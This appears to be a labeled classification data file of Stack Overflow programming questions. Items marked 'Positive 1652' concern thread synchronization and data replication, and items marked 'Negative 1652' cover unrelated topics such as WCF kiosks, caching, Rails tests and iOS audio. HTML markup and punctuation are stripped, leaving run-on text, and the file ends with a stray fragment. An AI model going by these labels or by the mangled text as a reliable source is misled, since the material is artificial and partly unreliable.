Positive 1652 pI have a method transfer which withdrawals money from one account and deposits it into another. There are 10 accounts each running with their own thread. I have another method test which sums up the total in each account to make sure that the bank has not lost or gained money. In order to have an accurate total, I created a boolean flag to indicate if testing is in progress. If it is, I need to somehow suspend the transfers until the test is finished. Ive tried to implement this using a synchronized block to tell the threads to wait on a condition and release once the condition is no longer true. For some reason Im having difficulty.

Positive 1652 pI have a couple of questions regarding sync between servers. I am planning to set up a failover redundancy server architecture using keepalived for Linux. The architecture would be similar to this.  a hrefhttpi.stack.imgur.comMQqvM.png relnofollowimg srchttpi.stack.imgur.comMQqvM.png altkeepalived failover network architecturea As we all know failoverredundancy servers needs to be synchronised to have consistent data across all the servers. One of the site recommended to run rsync to sync data between masterLB1 and secondaryLB2 servers periodically. At the worst case consistent data may not be available on a particular server at that point of time when sync hasnt happened yet. So I was wondering is it possible to feed data from the firewall itself to multiple systems in parallel so that there is no need for any sync Kindly let me know.p

Positive 1652 pI am trying using a hrefhttpslaunchpad.netmysqlreplicationlistener relnofollowMySQL Replication Listener Librarya to do data replication between HostA and HostB. p  pBasiclly its just like doing rowbased replication, but by myself other than mysql. Reading all row changes from HostAs bin log and applying all these changes to HostB.p  pThe issue I am encountering is, I am not able to disable triggers temporarily, which causes the data to be out of sync.p  pTake an example, suppose the database to be synchronized is TestSyncDB, and there are two tables in it which are Data and DataOp. The Data table has a trigger with it and once a record is inserted into this table, the trigger will generate a new record to the DataOp. p  pNow a new record is inserted into HostA.TestSyncDB.Data, since there is a trigger, so there will actually be two records adding to the tables, and the Replication Listener Library will return to me two queries, something likep  ol liinsert into HostA.TestSyncDB.Data   values ...         li liinsert into HostA.TestSyncDB.DataOp values ...   by triggerli ol  pThe problem is if I replay these two queries to HostB, there will be three new records added to tables in HostA.TestSyncDB, because of the triggers. Then data is never right ever after.p  pSo how to solve this Is is possible to disable triggers temporarily If not, how to do it correctly like what MySQL Replication doesp

Positive 1652 pI am looking to develop a multithreaded worker based subapplication. I was going through approaches on various site and suddenly tumbled onto a wiki page.p  pa hrefhttpsen.wikipedia.orgwikiThreadpoolpattern relnofollowhttpsen.wikipedia.orgwikiThreadpoolpatternap  blockquote   pWhen implementing this pattern, the programmer should ensure   threadsafety  of the queue. In Java, you can synchronize the relevant   method using the  synchronized keyword. This will bind the block   modified with synchronized  into one atomic structure, therefore   forcing any threads using the  associated resource to wait until there   are no threads using the resource.  I hope this is achievable by   applying mutex lock in c  As a drawback to  this method,   synchronization is rather expensive. You can also create an  object   that holds a list of all the jobs in a queue, which could be a    singleton.p blockquote  pWhat i want to understand is how a singleton object containing list of all Jobs would help me more than synchronizing the queue. And how will they be exactly different p  pP.S I know few of you might question the source of my content  wiki here but still , i would like to know more about it.p  pThanks in advance.p

Positive 1652 pWhile accessing updating a variable via multiple  threads  for eg A Bank class having class variable Double balance The above Bank class is similar to Joint Bank account of 5 customers. 5 customers of Bank are similary to 5 Threads of class Bank which are updating every time the value of double balance. As at any time any thread say T1 can come and read value of Balance. Which may be updated by T2 soon after T1 execute Reading, so T1 has read  previous values not the latest. How will the ACID property will be maintained. Like how balance can be consistent for every thread.

Positive 1652 pWe are developing an adapter component that sits between two documentprocessing systems. p  pstrongBrief Document Lifecycle Descriptionstrongp  ol liThe system A sends documents to the adapter one by one. li liThe adapter collects those documents, preforms validation and transforms the documents to a format that is understandable by the system B. Transformed documents are stored in a database.li liEvery 5 minutes transformed documents are taken from a database, packed to a package and sent to the system B. li ol  pstrongDocument Processing Detailsstrongp  pIt is possible that for a document an update could come to the adapter. This update looks like an ordinary document with the same identifier as an original one, but several fields differ. When such an update comes there are the following requirementsp  ol liIf an original document is sent to the system B, skip the updateli liIf an original document is not sent to the system B, send only the update.li ol  pAs it was described above there are two phases of the document processing validationtransformationpersisting documents one by one and document aggregationsending. p  pEach document has a dedicated database record. When an update comes, a corresponding record is updated no separate record creation. When a document arrives it has the New status, after being validated and transformed it gains the Ready for Sending status. After being sent as a part of a package  Sent status.p  pstrongProblem Statementstrongp  pThere is a possibility of the following scenario p  ol lia document arrives to the adapter  grabs the New statusli lithe document is validated and transformed successfully  Ready for Sending li lia collection of documents, containing the described document, is taken from a database and the package transformation process started  all documents are still in the Ready for Sending statusli liAn update arrives for one of the documents in a package, and a corresponding transaction commits  this document record is at the Ready for Sending status, but several fields changed so do a HibernateVersionmarked column.li liA package is formed and at the sending phase the adapter tries to set the Sent status for all the documents in the package, but fails with the OptimisticLock exception, which means that the whole package must be reprocessed.li ol  pOur adapter has a rate of 250 messages per second and usually a package contains at average 20000 transformed documents and the likelihood of facing the described issue is rather high. It is forbidden to forms and send several packages of lower size, also it is forbidden to loose documents or send duplicates.p  pOptimistic locking is crucial at the adapter because it grabs and processes documents in several parallel threads, thus an original document and an update could be processed at parallel...p  pstrongSolution Ideasstrongp  pWe are thinking about introducing a new status like On Package Forming just right before forming a package and setting up this status for each document in a separate transaction if some documents will raise an OptimisticLock exception, we will just reprocess this document. This solutions looks rather slow.  p  pCould you please suggest a solution for this case Maybe we have to change the approach completely p

Positive 1652 pIm trying to design a two digit counter the counts between 00 and 99 in a circular fashion both up and down. I have it working for the most part, however, no matter what I try I cant get the decade digit to stay in synch with the first digit.

Ive tried several things to try and fix this. The only thing to provide any beneficial result was to add an additional if statement that sent the overflow a state early, but that was only a supperficial fix.

Positive 1652 pIf we have 2 classes that operate on the same object under different threads and we want to avoid race conditions, well have to use  synchronized blocks with the same monitor like in the example belowp  precodeclass A      private DataObject mData  will be used as monitor       thread 3     public setObjectDataObject object         mData  object            thread 1     void operateOnData          synchronizedmData              mData.doSomething             .....             mData.doSomethingElse                   class B      private DataObject mData   will be used as monitor       thread 3     public setObjectDataObject object         mData  object            thread 2     void processData          synchronizedmData              mData.foo             ....             mData.bar                codepre  pThe object well operate on, will be set by calling codesetObjectcode and it will strongnot changestrong afterwards. Well use the object as a monitor. However, intelliJ will warn about synchronization on a nonfinal field. p  pIn this particular scenario, is the nonlocal field an acceptable solutionp  pAnother problem with the above approach is that it is not guaranteed that the monitor mData will be strongobservedstrong by thread 1 or thread 2 after it is set by thread 3, because a happensbefore relationship hasnt been established between setting and reading the monitor. It could be still observed as codenullcode by thread 1 for example. Is my speculation correctp  pRegarding possible solutions, making the codeDataObjectcode threadsafe is not an option. Setting the monitor in the constructor of the classes and declaring it codefinalcode can work.p  pstrongEDITstrong Semantically, the mutual exclusion needed is related to the codeDataObjectcode. This is the reason that I dont want to have a secondary monitor. One solution would be to add codelockcode and codeunlockcode methods on codeDataObjectcode that need to be called before working on it. Internally they would use a codeLockcode Object. So, the codeoperateOnDatacode method becomesp  precode void operateOnData       mData.lock      mData.doSomething      .....      mData.doSomethingElse      mData.unlock   codepre

Positive 1652 pI have recently discovered that you can connect the strongEclipse Task Liststrong with GitHub directly thus allowing a nice synchronization between a selected repository and what your are doing in the IDE related to that repository taskwise. Im using strongEclipse Mars 4.5.0strong.p  pI have created a GitHub Task Query you can see my settings belowp  pa hrefhttpi.stack.imgur.comqaNd3.png relnofollowimg srchttpi.stack.imgur.comqaNd3.png altGitHub task query settingsap  pAt first I was able to create two issues that also appeared on GitHub. Both issue were however placed in a folder in the Task List interface saying strongUnmatched Automatic container for repository tasks not matched by any querystrong. Weird...But since today things got even worse  all tasks I create are placed in the strongUnsubmittedstrong folder. This makes perfect sense with one exception  whenever I try to submit the task I getp  blockquote   blockquote     pSubmit failed Unexpected error Requires authentificationp   blockquote blockquote  pSo basically after two tasks I can no longer even submit anything. Upon creating a task I make sure I select the task query I have selected for my repository. Also the idea of all this task synchronization is supposed to be bidirectional right When I create a task in the strongEclipse Task Liststrong I expect that it will be displayed on the repositories strongIssues page on GitHubstrong and the other way around  when someone creates an issue on that same page it should appear in my task list. This is at least my understanding of synchronization. The task query doesnt show any issue whatsoever. Validating it returns that everything is perfectly fine. Pressing on the synchronization button even though I have enabled automatic synchronization also doesnt return any errors.p  pAm I missing something or this is one of the buggiest plugins for Eclipsep

Positive 1652 pI cannot see the reason for using strand for synchronization in Boost.asio HTTP Server3 example. As far as I can see in a hrefhttpwww.boost.orgdoclibs1590dochtmlboostasioexamplecpp03httpserver3connection.cpp relnofollowconnection.cppa there is always just one IO operation pending, consequently no simultaneous readwrite access to the buffrer. So it seems that any synchronization attempt is unnecessary here. What am I missing herep

Positive 1652 pThe requirement is that, I need to write an ArrayList of integers. I need threadsafe access of the different integers write, read, increase, decrease, and also need to allow maximum concurrency.p  pThe operation with each integer is also special, like this  Mostly frequent operation is to read  Secondly frequent operation is to decrease by one only if the value is greater than zero. Or, to increase by one unconditionally  Addingremoving elements is rare, but still needed.p  pI thought about AtomicInteger. However this becomes unavailable, because the atomic operation I want is to compare if not zero, then decrease. However the atomic operation provided by AtomicInteger, is compare if equal, and set. If you know how to apply AtomicInteger in this case, please raise it here.p  pWhat I am thinking is to synchronized the access to each integer like this p  precodeArrayList ltIntegergt list  ... ...  Compare if greater than zero, and decrease Integer n  list.getindex boolean success  false synchronized n      if ngt0  n successtrue     To add one Integer n  list.getindex synchronized n      n    To just read, I am thinking no need synchronization at all. int n  list.getindex.intValue codepre  pWith my solution, is there any sideeffect Is it efficient to maintain hundreds or even thousands of synchronized integersp  pThen another thing is to implement the operation of adddelete, that it is threadsafe, but do not impact much of the concurrency of the other operations. I am thinking ReadWriteLock, for adddelete, need to acquire the write lock, for other operations change the value of one integer, acquire the read lock.  Is this a right approachp

Negative 1652 pIn the kiosk system Im setting up, all Kiosks communicate with a central server to check in and receive update commands. I dont use the Dual Http communication because I cant guarantee what ports are going to be allowed at the client site, so communication is always initiated from the Kiosk client. I currently have an Update contract which returns an enum called KioskAction which represents all of the commands that a kiosk can do UpdateClient, SendLogFile, UpdateSetting, etc. This is working well enough, but Im wondering if there is a more elegant way of handling this. p  pThe current Update method on the Kiosk looks something like...p  precodevar kioskAction  KioskService.UpdatekioskId switchkioskAction      case KioskAction.SendLogFile         KioskService.SendLogFilekioskId, GetLogFile         break     case KioskAction.UpdateSettings         Setting[] settings  KioskService.GetKioskSettingsguid kioskId         UpdateSettingssettings         break     ...  codepre  pMy problem with this is that in order to add more kiosk functionality, I have to rebuild and redeploy both the kiosk application and the WCF service. What Im considering is returning a script of some sort probably IronPython which actually contains the code necessary to perform the action. Then I could add new functionality just by adding a new script to the system without any changes to the Kiosk application or the Kiosk Service.p  pThere are obviously some security concerns since the Kiosk Client is essentially running any code that the Kiosk Service returns, thus if the Kiosk Service is compromised, all of the Kiosks could be as well. Are there any other things I need to watch out for, or I should take into consideration before moving in this directionp

Negative 1652 pI want to do some caching at the data access layer to help boost performance. I have decided that I will use the HTTPContext cache, with an abstraction layer on top so i can switch in and out other caching strategies later on if needed. p  pBasically the cache should be variant, meaning that for each individual method it will cache a different result based on the values that are passed in. p  pMy question is given that if I am wanting to have a cache per function and for the system to determine whether to hit the database or the cache based on the values that are being passed into the method, how would I go about doing this i.e. taking a hash of the items values or something  but there must be a better way.p  pI know that I could do some stuff with cross cutting concerns and the EL and the Caching Application Block, but the overhead of that is a little more than I am looking for. I am wanting to do something fairly light weight and that I can control i.e. i could pass in a parameter that I could check which would bypass the cache  for instance p  pCheers Anthonyp

Negative 1652 pIm planning to build a console app to run as part of a SQL 2005 job which will gather records from a database table, create a request object for a WCF service, pass this object to the service for processing, receive a response object, and update a log table with its data.

Negative 1652 pDear Sir br as we know that the trees are recursive data structures, We use recurrsion in writing the procedures of tree like delete method of BST etc. br the advantage of recurrsion is, our procedures becomes very small for example the code of inorder traversal is of only 4 or 5 lines rather than a non recurrsive procedure which would be lengthy but not as complex as recurssive procedure in understanding perspective. that is why i hate recurrsion and i prefer to write non recurrsive procedure and i have done that in binary serach trees and avl trees.br Now please elaborate that, prefering non recursive procedures over recurrsive procedures is bad or good thing.p

Negative 1652 pIm struggling with following problem. Im having a view controller with scroll view. With this scroll view, user should be able to swipe through set of pages  like in apples weather app, so nothing uncommon. Then each page within the scroll view is table view, showing a list of items. And here Im getting into the problems.p  pIssue is that scroll view intercepts all touches to see if user moved his finger or just tapped some point inside some subview, and it doesnt pass events to its subviews or superview in case it recognizes a move.p  pThis behavior is causing a real problem in my case table view within scroll view, because table view is descendant of scroll view and its a view which is returned by hittesting under normal circumstances, which causes that all events are grabbed by table view, so its parent scroll view gets never called  so no swiping is ever performed.p  pNaturally, when I override hitTestwithEvent method in my subclass of table view and return a superview the scroll view, actually, situation is opposite  user can swipe through pages, but cannot scroll the table view.p  pSo what I need to figure out is how to  at any level  determine what action user wants to take swipe or scroll downup the table view and then pass event flow to appropriate component.p  pIm fighting with this problem couple of days now, but cannot get over. Below is what Ive ended with up so far. Its very simplified here. It does almost what I need  except that table view is never scrolled... Please note that my table view subclass always returns self.superview, which is the scroll view.p  precode UIViewController   void touchesBegan NSSet  touches withEvent UIEvent  event       [super touchesBegan touches withEvent event]       Save initial touch location for later use     motionStart  [[touches anyObject] locationInView self.scrollView]       Save reference to initial event     initialEvent  event       Fire timer     gestureTimer  [NSTimer scheduledTimerWithTimeInterval 0.2                                  targetself selectorselectorgestureTimer                                userInfo touches repeats NO]    void touchesMoved NSSet  touches withEvent UIEvent  event       ifgestureTimer ampamp forwardingTouchesToTableView       If no timer is running and no event forwarding is performed, pass to super         [super touchesMoved touches withEvent event]          else           Pass event to currently visible tableview         [self.scrollView.centerPage touchesMoved touches withEvent event]          void touchesEndedNSSet touches withEventUIEvent event       [super touchesEnded touches withEvent event]      ifforwardingTouchesToTableView          [self.scrollView.centerPage touchesEnded touches withEvent event]            Reset state     motionStart  CGPointZero      forwardingTouchesToTableView  NO    void gestureTimer NSTimer  timer       gestureTimer  nil      NSSet touches  NSSet timer.userInfo        UITouch touch  UITouch [touches anyObject]      CGPoint currentTouchLocation  [touch locationInView self.scrollView]      float deltaX  fabsmotionStart.x  currentTouchLocation.x     float deltaY  fabsmotionStart.y  currentTouchLocation.y      ifdeltaY gt 4.0 ampamp deltaX lt 12.0            Vertical move, forward to tableview         [self.scrollView cancelTouches]         forwardingTouchesToTableView  YES         [self.scrollView.centerPage touchesBegan touches  withEvent initialEvent]         initialEvent  nil          else           Horizontal swipe  just reset state         initialEvent  nil         forwardingTouchesToTableView  NO       codepre  pTo be honest, I dont yet what to do next.

Negative 1652 pIm working on a Rails application that requires you to be logged in to see pretty much anything. For unit tests, this isnt a problem since they interact with the model directly. For integration tests, this isnt a big problem since I can just have the appropriate user log in via Rails codepostcode method. It seems like it makes sense to put all rightssensitive tests in the integration tests e.g., test that a user cannot edit someone elses comments.p  pHowever, I run into issues when handling the functional tests. It seems like it makes sense for me to test functionality that does not hinge crucially on user status other than in its ability act as a gateway independently of user rights. Now, I cant figure out a good way to do this, since all requests bounce the test client to the login page.p  pAn inelegant solution I tried would be to put this log in request in the codesetupcode method, but the Rails tester tried to access an action, instead of a path. In particular, I hadp  precodedef setup   post sessionscreate, username gt testdbadmin, password gt password end codepre  pBut according to the logs, it just tried to access SomeControllersessionscreate, which is clearly not the intention.p  pI feel like Im missing some big, builtin way to do this.

Negative 1652 pI have POSIX in mind for implementation, though this question is more about architecture.p  pI am starting from an update loop that has several main jobs to do.  I can group those jobs into four or five main tasks that have common memory access requirements.  Its my idea to break off those jobs into their own threads and have them complete one cycle of update and sleep until the next frame.p  pBut how to synchronize  If I detach four or five threads at the start of each cycle, have them run once, die, and then detach another 45 threads on each pass  That sounds expensive.p  pIt sounds more reasonable to create these threads once, and have them go to sleep until a synchronized call wakes it up.p  pIs this a wise approach  Im open to accepting responses from just ideas to implementations of any kind. p  pEDIT based on the answers so far, Id like to addp  ul liconcurrency is desiredli lithese worker threads are intended to run at very short durations lt250msli lithe work done by each thread will always be the sameli liim considering 45 threads, 20 being a hard limit.li ul

Negative 1652 pIm investigating some memory corruption issues in an ethernet driver for an embedded system.p  pI suspect a problem between a bus mastering DMA controller and slow SDRAM.  So I want to use a bounce buffer in fast SRAM.  To do this I need two things I must place the SRAMs physical address from the bus masters perspective into the DMA controller buffer descriptor, and I must memcpy the data from the bounce buffer into the skbuff in SDRAM once the DMA controller reports an incoming packet.p  pWhat I havent been able to determine, from readingp  ul lia hrefhttpvger.kernel.orgdavemskb.html relnofollowhttpvger.kernel.orgdavemskb.htmlali lia hrefhttpvger.kernel.orgdavemskbdata.html relnofollowhttpvger.kernel.orgdavemskbdata.htmlali ul  pis whether skbdata is a physical or virtual address.  i.e. should I callp  precodememcpyskbgtdata, phystovirtbounceaddr, len codepre  porp  precodememcpyphystovirtskbgtdata, phystovirtbounceaddr, len codepre  pto get the packet into an skbuff so the rest of the linux networking stack can process itp  pEDIT a hrefhttpgitorious.orglinuxnios2linuxnios2blobsunstablenios2mmudriversnetalteratse.c relnofollowThis is the driver in questiona.  Id say that its passing virtual addresses into the DMA controller registers and therefore cant work, but I have a devkit on which this code works.

Negative 1652 pIm doing some Mac development in a WebView. I want to expand URLs that have been shortened by a url shortener, and display that expanded URL to the user. So, given a link whose src attribute is set to a hrefhttpis.gdxizMsr relnofollowhttpis.gdxizMsra, when the user hovers over the link I want the title tooltip to display a hrefhttpgoogle.com relnofollowhttpgoogle.comap  pMy link tag looks like thisp  precodelta hrefhttpis.gdxizMsr onMouseOvermyFunctionthisgtHeres a shortened link to googleltagt codepre  pAnd heres the relevant javascript, which will use XMLHttpRequest to fetch the expanded URL and then update the titlep  precodevar myRequest var mousedOverElement var isLoading  false  function myFunctionanObject    if isLoading  false       isLoading  true     mousedOverElement  anObject     var link  anObject.getAttributehref     var encodedURL  encodeURIlink     var url  httpis.gdforward.phpformatsimpleampshorturl  encodedURL      myRequest  new XMLHttpRequest     myRequest.openGET, url     myRequest.onreadystatechange  onStateChange     myRequest.send      function onStateChange       if myRequest.readyState4           if myRequest.status200                 mousedOverElement.setAttributetitle,myRequest.responseText                   isLoading  false       codepre  pThe problem is, when I hover over the link, and then stop moving the cursor, the title attribute is set properly, but the tooltip is not shown. I have to move the mouse again to make the tooltip show up. I dont necessarily have to move the cursor off of the link and then back over it, but simply moving a few pixels while remaining hovered over the link will do the trick.p  pI know that the title is being set properly from a combination of using the Web Inspector and the Javascript debugger in Safari. In fact, pretty much as soon as I hover over the link, I see the Web Inspectors view of the DOM in the elements tab update with the new title. But, if I take my hand off of the mouse, the tooltip never shows.p  pMy assumption here is that WebKit only shows a tooltip when the user is moving the mouse. Is there a way to sort of wake up webkit, even if the cursor is not moving Or am I better off implementing this with some of my own DHTMLish magic instead of relying on the title attributep

Negative 1652 pIm building an application whose usage is going to look something like thisp  precodeapplication command option1 option22 codepre  pBasically, there can be any number of options, but only one command per instance of the application. Similar to the way git works.p  pNow, I thought Id write it in C to get some boost and stl experience and have a go with a few of those design patterns I keep reading about. So, I implemented thisp  precodeclass Action  public     void AddParameterstdstring key, boostany p     virtual unsigned int ExecuteAction  protected     stdmapltstdstring, boostanygt parameters  codepre  pIll explain my logic anyway, just to check it  this is an abstractish action. All actions need option adding, hence the parameters map, so that we can implement at this level, but we expect codeExecuteActioncode to be implemented by derived classes, such as my simple example codeDisplayHelpActioncode, which does pretty much what it says on the tin.p  pSo now Ive written a factory, like sop  precodeclass DetermineAction  public     DetermineAction     vxmoderoAction getActionstdstring ActionString private     stdmapltstdstring, vxmoderoActiongt cmdmap  codepre  pThe logic being that the constructor will create a map of possible strings you can ask for and getAction will do what it says  give it a command string and itll give you a class that is derived from codeActioncode which implements the desired functionality.p  pIm having trouble with that constructor. I am trying thisp  precodethisgtcmdmap  stdmapltstdstring, Actiongt thisgtcmdmap.insertpairltstring, Actiongthelp, DisplayHelpAction thisgtcmdmap.insertpairltstring, Actiongtlicense, DisplayLicenseAction codepre  pWhich is causing a lot of errors. Now, Im used to the Java Way of interfaces, so you usep  precodeInterface I  new ConcreteClass codepre  pand Java likes it. So thats the sort of idea Im trying to achieve here, because what I want do have for the implementation of codegetActioncode is thisp  precodereturn thisgtcmdmap[ActionString] codepre  pWhich should return a class derived from Action, on which I can then start adding parameters and call execute.p  pSo, to summarise, I have two questions which are closely relatedp  ul liSoundboard. Im deliberately practising abstracting things, so theres some additional complexity there, but in principle, is my approach sound Is there an insanely obvious shortcut Ive missed Is there a better method I should be using li lipHow can I set up my class mapping solution so that I can return the correct class The specific complaint is linktime and isp  precodeLinking CXX executable myapp CMakeFilesmyapp.dirabstractcmd.cpp.o In function nfActionAction abstractcmd.cpp.text.ZN2vx6modero6ActionC2Ev[ZN2vx6modero6ActionC5Ev]0x13 undefined reference to vtable for nfAction codepreli ul  pJust because it might be relevant, Im using codeboostprogramoptionscode for command line parsing. p  hr  pstrongEdit 1strong Ok, I have now replaced codeActioncode with codeActioncode as per Eugens answer and am trying to add codenew SomethingThatSubclassesActioncode to the map.

Negative 1652 pcould you please give me any tips on where the problem might be Im very new to ObjC, so I sort of got stuck.p  pI use a C built library which generates various sounds and I would like to play these sounds using AVAudioPlayer. However, I observe some kind of suprising behaviour of audioPlayerDidFinishPlaying. Ill illustrate it on the following example.p  pThis is my .h file with the irrelevant stuff left outp  precodeimport ltAVFoundationAVFoundation.hgt interface mytestappViewController  UIViewController ltAVAudioPlayerDelegategt      AVAudioPlayer player     ....   void HaveSoundCallbackconst short psSamples, long lSamplesNum, void pOwner .... property nonatomic, retain   AVAudioPlayer   player  end codepre  pAnd this is one part of the implementationp  precode.... import MyCplusplusSoundGeneratingLibrary.h ....  IBActionGoButtonTouchedUIButton sender      calling the C made GenerateSound and passing it the callback     int retGenerateSoundcoupleofparameters, HaveSoundCallback, self  codepre  pGenerally I dont know how many sounds the GenerateSound function will produce per one calling, but whenever it produces one, it calls HaveSoundCallback that is supposed to take care of it it also sends self as the owner of the sound.p  pNow this is the callback implementation its in the same .mm but outside implementation...endp  precodevoid HaveSoundCallbackconst short psSamples, long lSamplesNum, void pOwner     NSString OutWave      NSLogEntered the callback function     OutWave[pOwner getDocumentFileout.wav]     [pOwner SaveSoundDataOutWave pcmpsSamples lenlSamplesNum]     [pOwner PlaySoundOutWave]     [OutWave release]  codepre  pIt means that the callback function saves the sound data to a wav by calling SaveSoundData and then it calls PlaySound to play them. PlaySound and audioPlayerDidFinishPlaying implementation are again in the mytestappViewController classp  precode voidPlaySoundNSString WaveFile     NSURL fileURL  [[NSURL alloc] initFileURLWithPathWaveFile]      NSLogPlaying started     self.player [[AVAudioPlayer alloc] initWithContentsOfURLfileURL errornil]        self.player.delegate  self     [self.player play]     while self.player.playing          sleep0.01          [fileURL release]     NSLogPlaying finished     voidaudioPlayerDidFinishPlayingAVAudioPlayer p successfullyBOOLflag      NSLoghi from audioPlayerDidFinishPlaying  codepre  pI intentionally wait here in the while loop so as to prevent the player from playing all possible returning sounds concurrently  another callback happens after the player stops playing the current sound. But I would like to trigger the finished playing by the player.delegate. So for my experimental and ObjC selftutoring purposes I implemented the audioPlayerDidFinishPlaying delegate.p  pAnd now the testing situation lets say that GenerateSound produces 3 sounds with short delays between them. I would expect the output console to be something likep  precodeEntered the callback function Playing started hi from audioPlayerDidFinishPlaying Playing finished Entered the callback function Playing started hi from audioPlayerDidFinishPlaying Playing finished Entered the callback function Playing started hi from audioPlayerDidFinishPlaying Playing finished codepre  pBut instead of this, the audioPlayerDidFinishPlaying is called at the very end 3 times, i.e.p  precodeEntered the callback function Playing started Playing finished Entered the callback function Playing started Playing finished Entered the callback function Playing started Playing finished hi from audioPlayerDidFinishPlaying hi from audioPlayerDidFinishPlaying hi from audioPlayerDidFinishPlaying codepre  pWhat do I do wrong Why isnt the audioPlayerDidFinishPlaying executed immediately when the playing really finished, and instead it gets stacked somewhere and is executed 3 times at the endp  pHas it something to do with the fact that the program is actually all the time inside the C library function GenerateSound, and thus the audioPlayerDidFinishPlaying is executed as soon as GenerateSound is left And if yes, is there any better way implement the functionality which Id like to getp  pThanks a lot in advance for any helpp

However here is my issue.p  pIn the desktop version in MODULE 1 we have views that contain a component that will stay on screen on the left hand side and on the right hand side we have components that will change depending on actions taken on left side. A custom built list component on the left and data on the right The data on the right has SEVEN sub views to it that basically show different content when each is selected.p  pIn the Desktop App, we used the ViewStack to do this. Pressing the list item and change what shows in viewStack on the right. Then within that ViewStack are 7 more buttons that can be clicked to change what is shown in that view.p  pHowever in the Android App we cannot use the viewStack as it isnt optimised. So I need to know what is best for doing this view change I want to avoid States as much as possible.p  pHope that makes sense, as it is difficult to describe without breaking the NDA.p

Negative 1652 ptldr is it possible to have grouping levels within a subreport which gets its data entirely from the main report I need to produce a single report which takes a single set of data and displays four or more different summarizationscalculations on the data.p  pp  pIt would be easy enough to make a separate stored procedure call in each subreport. But since a lot of the data will be common to all of the subreports, Id like to avoid the performance cost of getting the same data from SQL Server repeatedly. p  pId like to get all the raw data once, from a single stored procedure, and link that data to the various subreports within the single .RPT file. So far it seems that I cannot use the Group Expert in a subreport that does not call a stored procedure  there are no Report Fields displayed to select for grouping. p  pThe subreports could be described as cost summaries, calculated as follows A summary for all months, A breakdown of just the current month, calculated averages per personmonth, and multiple cost breakdowns by plan for the current month. p  pFor the first subreport, I can get the desired data as parameters, by linking desired fields and parameters from the main report. I would need to group this to group this data by the month of a particular date column, with one row per month and a grand total at the end. But if I click on the Group Expert in that subreport, there are no Report Fields available for me to group by. p  pSince all of the calculations involve a single set of data, Id like to just get that set from a single stored proc call, and have Crystal perform the various calculations.p  pCan this be done in Crystal Reports XI, with or without subreports, without having multiple calls to the database that return the same data more than oncep

Negative 1652 pIm maintaining and publishing an open source package which needs to be built for Windows and Linux. Ive chosen to crosscompile with mingw, and used Debian packages for building and maintaining the binaries for my Windows packages.

I had hacked a solution by putting the necessary files into a directory and using codeaptget o RootDircode to change apts root into this directory.

So, my RootDir solution got impracticable, it would be quite a lot of work to set up a proper chroot.p  pDoes anyone have an idea how I could get the package list any other way That is, get a list of .debs and all their dependencies for a specific package on a nonnative architecture p

Negative 1652 pControllers are there in MVC pattern to process user input and output. So, input validation and response preparation should be done in a controller. p  pFor instance, I have a controller method save whichp  ul lilooks for input data li liruns a validator on the datali liif inputs are valid, loads an appropriate model, sets its fields to input values, and calls its codesavecode methodli liif inputs are invalid, prepares data to reload the edit form, shows the formli ul  pAll this sequence creates quite a mess of linear code. Id like to separate it somehow. Do I move the validation part to a model Sounds wrong Do I create a special library class to handle inputsp  pIn Asp.Net MVC this would be better as they have implemented the object binder pattern. Hence, the validation and model field binding goes away and controller gets much lighter. Is there something similar for CodeIgniterp

Negative 1652 pI have several XIBs following this pattern a View Controller subclass containing a View subclass. I put my controls on that view.p  pJust now, I tried to add a new control to the view. I can do this, but Im unable to connect the new control to an outlet. The assistant editor wont display the view subclass header either, though it will for a short while if I restart Xcode. Some other XIBs I have dont have the view controller object but instead have Files Owner set to a view controller subclass. They show the same problem.p  pHere is the Objects bar in IBp  pimg srchttpi.stack.imgur.comcugBK.png altenter image description herep  pMatrix Editor View Controller is a UIViewController subclass.

This is where the majority of my outlets and actions live. Previously this would show up in the Assistant Editor Counterparts menu and I could drag between it and my controls and the code quite happily. Now, whenever I add a new control in to this view, I cant drag from the Popup Cell View object to the new control, nor can I drag from the new control to the Assistant Editor window if its showing the Popup Cell View header.p  pI recently had to upgrade to Lion and hence Xcode 4.2.1 build 4D502 the last time I added controls to my XIBs was under Snow Leopard with the latest Xcode on that OS.p  pI believe that Xcodes caches or some internal state are out of whack. I have triedp  ul liRestarting Xcodeli liA cleanli liRemoving and readding the view subclass from the projectli liDeleting the DerivedData folders contents from LibraryDeveloperXcodeli ul  pAnd various combinations thereof. What else can I do to force Xcode to rescan everything and allow me to connect up my controls to outletsp  pEdit I have noticed that I can create outlets in the View Controller for my new controls Im just not able to do this on the View subclass itself which is where I want them. I already have many on there. Could my new version of Xcode really be telling me that Im not allowed to do this Surely not. The Assistant Editors Automatic mode changes every minute or so between two counterparts the VC .h and .m and four the VC .h.m and the View .h.m.p  pEdit I emwasem able to connect an outlet, but only via this convoluted methodp  ol liForce the assistant editor to open my View subclassli liManually typing in an outlet for my new controlli liDragging from the outlet in the assistant editor to the control itselfli ol  pSo something is very clearly broken.

Negative 1652 pI emthinkem that event handlers are processed in the order that they are registered. Is that correct If that is the case then if I attach an event handler at the beginning of my script, can I be absolutely certain that it will fire before subsequent handlers attached to the same event Also do event namespaces have any effect on this Are event handlers fired in series one finishes before the next or in parallelp  pI want to do this because my script relies on the viewport size, which changes on the resize event, and I need to constantly look for it. Rather than calling codewindow.widthcode repeatedly in each of my handler functions, Id like to put a handler at the top of my script that saves codewindow.widthcode to an object property on each resize. Then in subsequent handlers I can access the property and be certain that it is the most recent measurement.p  pI know I could create a custom event that triggers as soon as the calculation is done and attach subsequent handlers to the custom event. But, Id dont want to do that because I need to maintain interoperability with plugins that come after mine that may also be attaching to the resize event.p

Then it says codecurrent.nextcode is equal to a codenullcode node codepreviouscode. Then it says codepreviouscode is now codecurrentcode.

